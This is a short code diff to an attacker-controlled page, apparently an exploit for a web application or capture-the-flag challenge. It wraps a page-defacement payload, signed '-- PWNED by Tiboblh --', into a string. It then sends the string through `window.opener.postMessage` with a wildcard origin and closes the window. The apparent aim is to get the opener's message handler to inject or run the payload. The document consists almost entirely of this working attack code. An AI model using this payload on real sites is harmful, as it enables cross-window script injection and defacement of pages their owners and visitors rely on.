@@ -1,5 +1,6 @@
 <script>
-document.body.innerHTML = `
+const payload = `
+document.body.innerHTML = \`
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -39,7 +40,9 @@ document.body.innerHTML = `
   <p class="footer">-- PWNED by Tiboblh --</p>
 </body>
 </html>
+\`;
 `;
+
 
 window.opener.postMessage({maVariable: payload}, '*');
 window.close();
